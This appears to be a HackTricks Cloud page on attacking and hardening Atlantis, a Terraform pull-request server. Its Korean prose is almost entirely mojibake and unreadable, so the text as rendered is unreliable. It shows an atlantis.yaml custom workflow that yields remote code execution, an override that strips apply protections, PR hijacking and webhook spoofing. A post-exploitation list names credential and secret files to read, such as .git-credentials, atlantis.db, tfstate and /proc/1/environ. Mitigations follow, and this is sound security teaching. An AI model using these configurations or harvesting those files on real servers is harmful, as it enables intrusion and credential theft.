{% hint style="danger" %}
[**ì„œë²„ ì¸¡ êµ¬ì„±**](https://www.runatlantis.io/docs/server-side-repo-config.html#server-side-config) í”Œë˜ê·¸ `allow_custom_workflows`ê°€ **True**ë¡œ ì„¤ì •ë˜ë©´, ê° ë¦¬í¬ì˜ **`atlantis.yaml`** íŒŒì¼ì— ì›Œí¬í”Œë¡œë¥¼ **ì§€ì •**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. **`allowed_overrides`**ê°€ **ì›Œí¬í”Œë¡œ**ë¥¼ **ì¬ì •ì˜**í•˜ë„ë¡ ì§€ì •í•˜ëŠ” ê²ƒë„ ì ì¬ì ìœ¼ë¡œ í•„ìš”í•©ë‹ˆë‹¤.

ì´ê²ƒì€ ê¸°ë³¸ì ìœ¼ë¡œ **í•´ë‹¹ ë¦¬í¬ì— ì ‘ê·¼í•  ìˆ˜ ìˆëŠ” ëª¨ë“  ì‚¬ìš©ìì—ê²Œ Atlantis ì„œë²„ì—ì„œ RCEë¥¼ ì œê³µí•©ë‹ˆë‹¤**.
```yaml
# atlantis.yaml
version: 3
projects:
- dir: .
workflow: custom1
workflows:
custom1:
plan:
steps:
- init
- run: my custom plan command
apply:
steps:
- run: my custom apply command
```
{% endhint %}

#### ê³„íš/ì ìš© ë³´í˜¸ ìš°íšŒ

ë§Œì•½ [**ì„œë²„ ì¸¡ êµ¬ì„±**](https://www.runatlantis.io/docs/server-side-repo-config.html#server-side-config) í”Œë˜ê·¸ `allowed_overrides`ê°€ `apply_requirements`ë¡œ ì„¤ì •ë˜ì–´ ìˆë‹¤ë©´, ë¦¬í¬ê°€ **ê³„íš/ì ìš© ë³´í˜¸ë¥¼ ìˆ˜ì •í•˜ì—¬ ìš°íšŒí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤**.
```yaml
repos:
- id: /.*/
apply_requirements: []
```
#### PR Hijacking

ëˆ„êµ°ê°€ **ìœ íš¨í•œ í’€ ë¦¬í€˜ìŠ¤íŠ¸ì— `atlantis plan/apply` ëŒ“ê¸€ì„ ë³´ë‚´ë©´,** ì›í•˜ì§€ ì•Šì„ ë•Œ terraformì´ ì‹¤í–‰ë©ë‹ˆë‹¤.

ê²Œë‹¤ê°€, **ìƒˆ ì»¤ë°‹ì´ í‘¸ì‹œë  ë•Œë§ˆë‹¤** ëª¨ë“  PRì„ **ì¬í‰ê°€**í•˜ë„ë¡ **ë¸Œëœì¹˜ ë³´í˜¸**ì— ì„¤ì •í•˜ì§€ ì•Šì•˜ë‹¤ë©´, ëˆ„êµ°ê°€ **ì•…ì˜ì ì¸ êµ¬ì„±**(ì´ì „ ì‹œë‚˜ë¦¬ì˜¤ í™•ì¸)ì„ terraform êµ¬ì„±ì— ì‘ì„±í•˜ê³  `atlantis plan/apply`ë¥¼ ì‹¤í–‰í•˜ì—¬ RCEë¥¼ ì–»ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ì´ê²ƒì´ Github ë¸Œëœì¹˜ ë³´í˜¸ì˜ **ì„¤ì •**ì…ë‹ˆë‹¤:

![](<../.gitbook/assets/image (216).png>)

#### Webhook Secret

**ì›¹í›… ë¹„ë°€ì„ í›”ì¹˜ê±°ë‚˜** **ì›¹í›… ë¹„ë°€ì´ ì‚¬ìš©ë˜ì§€ ì•ŠëŠ” ê²½ìš°** Atlantis ì›¹í›…ì„ **í˜¸ì¶œí•˜ê³  atlatis ëª…ë ¹ì„** ì§ì ‘ **í˜¸ì¶œí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.**

#### Bitbucket

Bitbucket CloudëŠ” **ì›¹í›… ë¹„ë°€ì„ ì§€ì›í•˜ì§€ ì•ŠìŠµë‹ˆë‹¤**. ì´ëŠ” ê³µê²©ìê°€ **Bitbucketì—ì„œ ìš”ì²­ì„ ìŠ¤í‘¸í•‘**í•  ìˆ˜ ìˆê²Œ í•©ë‹ˆë‹¤. Bitbucket IPë§Œ í—ˆìš©í•˜ê³  ìˆëŠ”ì§€ í™•ì¸í•˜ì„¸ìš”.

* ì´ëŠ” **ê³µê²©ì**ê°€ Bitbucketì—ì„œ ì˜¤ëŠ” ê²ƒì²˜ëŸ¼ ë³´ì´ëŠ” **ê°€ì§œ ìš”ì²­ì„ Atlantisì— ë³´ë‚¼ ìˆ˜ ìˆë‹¤ëŠ” ì˜ë¯¸ì…ë‹ˆë‹¤.**
* `--repo-allowlist`ë¥¼ ì§€ì •í•˜ëŠ” ê²½ìš°, ê·¸ë“¤ì€ í•´ë‹¹ ë¦¬í¬ì§€í† ë¦¬ì— ê´€ë ¨ëœ ìš”ì²­ë§Œ ê°€ì§œë¡œ ë§Œë“¤ ìˆ˜ ìˆìœ¼ë¯€ë¡œ ê·¸ë“¤ì´ í•  ìˆ˜ ìˆëŠ” ê°€ì¥ í° í”¼í•´ëŠ” ìì‹ ì˜ ë¦¬í¬ì§€í† ë¦¬ì—ì„œ plan/applyí•˜ëŠ” ê²ƒì…ë‹ˆë‹¤.
* ì´ë¥¼ ë°©ì§€í•˜ê¸° ìœ„í•´ [Bitbucketì˜ IP ì£¼ì†Œ](https://confluence.atlassian.com/bitbucket/what-are-the-bitbucket-cloud-ip-addresses-i-should-use-to-configure-my-corporate-firewall-343343385.html)ë¥¼ í—ˆìš© ëª©ë¡ì— ì¶”ê°€í•˜ì„¸ìš” (ì•„ì›ƒë°”ìš´ë“œ IPv4 ì£¼ì†Œ ì°¸ì¡°).

### Post-Exploitation

ì„œë²„ì— ì ‘ê·¼í•˜ê±°ë‚˜ ìµœì†Œí•œ LFIë¥¼ ì–»ì—ˆë‹¤ë©´, ì½ì–´ë³¼ ë§Œí•œ í¥ë¯¸ë¡œìš´ ê²ƒë“¤ì´ ìˆìŠµë‹ˆë‹¤:

* `/home/atlantis/.git-credentials` VCS ì ‘ê·¼ ìê²© ì¦ëª… í¬í•¨
* `/atlantis-data/atlantis.db` ë” ë§ì€ ì •ë³´ì™€ í•¨ê»˜ VCS ì ‘ê·¼ ìê²© ì¦ëª… í¬í•¨
* `/atlantis-data/repos/<org_name>`_`/`_`<repo_name>/<pr_num>/<workspace>/<path_to_dir>/.terraform/terraform.tfstate` Terraform ìƒíƒœ íŒŒì¼
* ì˜ˆ: /atlantis-data/repos/ghOrg\_/\_myRepo/20/default/env/prod/.terraform/terraform.tfstate
* `/proc/1/environ` í™˜ê²½ ë³€ìˆ˜
* `/proc/[2-20]/cmdline` `atlantis server`ì˜ ëª…ë ¹ì¤„ (ë¯¼ê°í•œ ë°ì´í„° í¬í•¨ ê°€ëŠ¥)

### Mitigations

#### Don't Use On Public Repos <a href="#don-t-use-on-public-repos" id="don-t-use-on-public-repos"></a>

ëˆ„êµ¬ë‚˜ ê³µê°œ í’€ ë¦¬í€˜ìŠ¤íŠ¸ì— ëŒ“ê¸€ì„ ë‹¬ ìˆ˜ ìˆê¸° ë•Œë¬¸ì—, ëª¨ë“  ë³´ì•ˆ ì™„í™” ì¡°ì¹˜ê°€ ìˆë”ë¼ë„ ì ì ˆí•œ ë³´ì•ˆ ì„¤ì • ì—†ì´ ê³µê°œ ë¦¬í¬ì§€í† ë¦¬ì—ì„œ Atlantisë¥¼ ì‹¤í–‰í•˜ëŠ” ê²ƒì€ ì—¬ì „íˆ ìœ„í—˜í•©ë‹ˆë‹¤.

#### Don't Use `--allow-fork-prs` <a href="#don-t-use-allow-fork-prs" id="don-t-use-allow-fork-prs"></a>

ê³µê°œ ë¦¬í¬ì§€í† ë¦¬ì—ì„œ ì‹¤í–‰ ì¤‘ì´ë¼ë©´(ì¶”ì²œí•˜ì§€ ì•ŠìŒ, ìœ„ ì°¸ì¡°) `--allow-fork-prs`ë¥¼ ì„¤ì •í•˜ì§€ ë§ì•„ì•¼ í•©ë‹ˆë‹¤(ê¸°ë³¸ê°’ì€ false) ì™œëƒí•˜ë©´ ëˆ„êµ¬ë‚˜ ìì‹ ì˜ í¬í¬ì—ì„œ ê·€í•˜ì˜ ë¦¬í¬ì§€í† ë¦¬ë¡œ í’€ ë¦¬í€˜ìŠ¤íŠ¸ë¥¼ ì—´ ìˆ˜ ìˆê¸° ë•Œë¬¸ì…ë‹ˆë‹¤.

#### `--repo-allowlist` <a href="#repo-allowlist" id="repo-allowlist"></a>

AtlantisëŠ” `--repo-allowlist` í”Œë˜ê·¸ë¥¼ í†µí•´ ì›¹í›…ì„ ìˆ˜ë½í•  ë¦¬í¬ì§€í† ë¦¬ì˜ í—ˆìš© ëª©ë¡ì„ ì§€ì •í•´ì•¼ í•©ë‹ˆë‹¤. ì˜ˆë¥¼ ë“¤ì–´:

* íŠ¹ì • ë¦¬í¬ì§€í† ë¦¬: `--repo-allowlist=github.com/runatlantis/atlantis,github.com/runatlantis/atlantis-tests`
* ì „ì²´ ì¡°ì§: `--repo-allowlist=github.com/runatlantis/*`
* GitHub Enterprise ì„¤ì¹˜ì˜ ëª¨ë“  ë¦¬í¬ì§€í† ë¦¬: `--repo-allowlist=github.yourcompany.com/*`
* ëª¨ë“  ë¦¬í¬ì§€í† ë¦¬: `--repo-allowlist=*`. ë³´í˜¸ëœ ë„¤íŠ¸ì›Œí¬ì— ìˆì„ ë•Œ ìœ ìš©í•˜ì§€ë§Œ ì›¹í›… ë¹„ë°€ì„ ì„¤ì •í•˜ì§€ ì•Šìœ¼ë©´ ìœ„í—˜í•©ë‹ˆë‹¤.

ì´ í”Œë˜ê·¸ëŠ” ê·€í•˜ì˜ Atlantis ì„¤ì¹˜ê°€ ê·€í•˜ê°€ ì œì–´í•˜ì§€ ì•ŠëŠ” ë¦¬í¬ì§€í† ë¦¬ì™€ í•¨ê»˜ ì‚¬ìš©ë˜ì§€ ì•Šë„ë¡ ë³´ì¥í•©ë‹ˆë‹¤. ë” ë§ì€ ì„¸ë¶€ì •ë³´ëŠ” `atlantis server --help`ë¥¼ ì°¸ì¡°í•˜ì„¸ìš”.

#### Protect Terraform Planning <a href="#protect-terraform-planning" id="protect-terraform-planning"></a>

ê³µê²©ìê°€ ì•…ì˜ì ì¸ Terraform ì½”ë“œë¥¼ í¬í•¨í•œ í’€ ë¦¬í€˜ìŠ¤íŠ¸ë¥¼ ì œì¶œí•˜ëŠ” ê²ƒì´ ìœ„í˜‘ ëª¨ë¸ì— í¬í•¨ëœë‹¤ë©´, `terraform apply` ìŠ¹ì¸ì´ ì¶©ë¶„í•˜ì§€ ì•Šë‹¤ëŠ” ê²ƒì„ ì¸ì‹í•´ì•¼ í•©ë‹ˆë‹¤. [`external` ë°ì´í„° ì†ŒìŠ¤](https://registry.terraform.io/providers/hashicorp/external/latest/docs/data-sources/data_source)ë¥¼ ì‚¬ìš©í•˜ê±°ë‚˜ ì•…ì˜ì ì¸ ê³µê¸‰ìë¥¼ ì§€ì •í•˜ì—¬ `terraform plan`ì—ì„œ ì•…ì˜ì ì¸ ì½”ë“œë¥¼ ì‹¤í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ ì½”ë“œëŠ” ê·€í•˜ì˜ ìê²© ì¦ëª…ì„ ìœ ì¶œí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ì´ë¥¼ ë°©ì§€í•˜ê¸° ìœ„í•´ ë‹¤ìŒì„ ìˆ˜í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:

1. ê³µê¸‰ìë¥¼ Atlantis ì´ë¯¸ì§€ì— í¬í•¨ì‹œí‚¤ê±°ë‚˜ í˜¸ìŠ¤íŒ…í•˜ê³  í”„ë¡œë•ì…˜ì—ì„œ ì´ê·¸ë ˆìŠ¤ë¥¼ ê±°ë¶€í•©ë‹ˆë‹¤.
2. ê³µê¸‰ì ë ˆì§€ìŠ¤íŠ¸ë¦¬ í”„ë¡œí† ì½œì„ ë‚´ë¶€ì ìœ¼ë¡œ êµ¬í˜„í•˜ê³  ê³µìš© ì´ê·¸ë ˆìŠ¤ë¥¼ ê±°ë¶€í•˜ì—¬ ë ˆì§€ìŠ¤íŠ¸ë¦¬ì— ëŒ€í•œ ì“°ê¸° ì ‘ê·¼ì„ ì œì–´í•©ë‹ˆë‹¤.
3. [ì„œë²„ ì¸¡ ë¦¬í¬ êµ¬ì„±](https://www.runatlantis.io/docs/server-side-repo-config.html)ì˜ `plan` ë‹¨ê³„ë¥¼ ìˆ˜ì •í•˜ì—¬ í—ˆìš©ë˜ì§€ ì•Šì€ ê³µê¸‰ì ë˜ëŠ” ë°ì´í„° ì†ŒìŠ¤ ë˜ëŠ” í—ˆìš©ë˜ì§€ ì•Šì€ ì‚¬ìš©ìë¡œë¶€í„°ì˜ PR ì‚¬ìš©ì„ ê²€ì¦í•©ë‹ˆë‹¤. ì´ ì‹œì ì—ì„œ ì¶”ê°€ ê²€ì¦ì„ ì¶”ê°€í•  ìˆ˜ë„ ìˆìŠµë‹ˆë‹¤. ì˜ˆë¥¼ ë“¤ì–´, `plan`ì´ ê³„ì† ì§„í–‰ë˜ê¸° ì „ì— PRì— "ì¢‹ì•„ìš”"ê°€ í•„ìš”í•˜ë„ë¡ ìš”êµ¬í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. Conftestê°€ ì—¬ê¸°ì„œ ìœ ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

#### Webhook Secrets <a href="#webhook-secrets" id="webhook-secrets"></a>

AtlantisëŠ” `$ATLANTIS_GH_WEBHOOK_SECRET`/`$ATLANTIS_GITLAB_WEBHOOK_SECRET` í™˜ê²½ ë³€ìˆ˜ë¥¼ í†µí•´ ì„¤ì •ëœ ì›¹í›… ë¹„ë°€ë¡œ ì‹¤í–‰ë˜ì–´ì•¼ í•©ë‹ˆë‹¤. `--repo-allowlist` í”Œë˜ê·¸ê°€ ì„¤ì •ë˜ì–´ ìˆë”ë¼ë„, ì›¹í›… ë¹„ë°€ì´ ì—†ìœ¼ë©´ ê³µê²©ìê°€ í—ˆìš© ëª©ë¡ì— ìˆëŠ” ë¦¬í¬ì§€í† ë¦¬ì¸ ì²™ í•˜ì—¬ Atlantisì— ìš”ì²­ì„ ë³´ë‚¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì›¹í›… ë¹„ë°€ì€ ì›¹í›… ìš”ì²­ì´ ì‹¤ì œë¡œ ê·€í•˜ì˜ VCS ì œê³µì(GitHub ë˜ëŠ” GitLab)ì—ì„œ ì˜¤ëŠ” ê²ƒì„ì„ ë³´ì¥í•©ë‹ˆë‹¤.

Azure DevOpsë¥¼ ì‚¬ìš©í•˜ëŠ” ê²½ìš°, ì›¹í›… ë¹„ë°€ ëŒ€ì‹  ê¸°ë³¸ ì‚¬ìš©ì ì´ë¦„ê³¼ ë¹„ë°€ë²ˆí˜¸ë¥¼ ì¶”ê°€í•˜ì„¸ìš”.

#### Azure DevOps Basic Authentication <a href="#azure-devops-basic-authentication" id="azure-devops-basic-authentication"></a>

Azure DevOpsëŠ” ëª¨ë“  ì›¹í›… ì´ë²¤íŠ¸ì—ì„œ ê¸°ë³¸ ì¸ì¦ í—¤ë”ë¥¼ ì „ì†¡í•˜ëŠ” ê²ƒì„ ì§€ì›í•©ë‹ˆë‹¤. ì´ëŠ” ì›¹í›… ìœ„ì¹˜ì— HTTPS URLì„ ì‚¬ìš©í•˜ëŠ” ê²ƒì„ ìš”êµ¬í•©ë‹ˆë‹¤.

#### SSL/HTTPS <a href="#ssl-https" id="ssl-https"></a>

ì›¹í›… ë¹„ë°€ì„ ì‚¬ìš©í•˜ê³  ìˆì§€ë§Œ íŠ¸ë˜í”½ì´ HTTPë¥¼ í†µí•´ ì „ì†¡ë˜ëŠ” ê²½ìš° ì›¹í›… ë¹„ë°€ì´ ë„ë‚œë‹¹í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. `--ssl-cert-file` ë° `--ssl-key-file` í”Œë˜ê·¸ë¥¼ ì‚¬ìš©í•˜ì—¬ SSL/HTTPSë¥¼ í™œì„±í™”í•˜ì„¸ìš”.

#### Enable Authentication on Atlantis Web Server <a href="#enable-authentication-on-atlantis-web-server" id="enable-authentication-on-atlantis-web-server"></a>

ì›¹ ì„œë¹„ìŠ¤ì—ì„œ ì¸ì¦ì„ í™œì„±í™”í•˜ëŠ” ê²ƒì´ ë§¤ìš° ê¶Œì¥ë©ë‹ˆë‹¤. `--web-basic-auth=true`ë¥¼ ì‚¬ìš©í•˜ì—¬ BasicAuthë¥¼ í™œì„±í™”í•˜ê³  `--web-username=yourUsername` ë° `--web-password=yourPassword` í”Œë˜ê·¸ë¥¼ ì‚¬ìš©í•˜ì—¬ ì‚¬ìš©ì ì´ë¦„ê³¼ ë¹„ë°€ë²ˆí˜¸ë¥¼ ì„¤ì •í•˜ì„¸ìš”.

ì´ê²ƒë“¤ì„ í™˜ê²½ ë³€ìˆ˜ë¡œë„ ì „ë‹¬í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤ `ATLANTIS_WEB_BASIC_AUTH=true` `ATLANTIS_WEB_USERNAME=yourUsername` ë° `ATLANTIS_WEB_PASSWORD=yourPassword`.

### References

* [**https://www.runatlantis.io/docs**](https://www.runatlantis.io/docs)
* [**https://www.runatlantis.io/docs/provider-credentials.html**](https://www.runatlantis.io/docs/provider-credentials.html)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
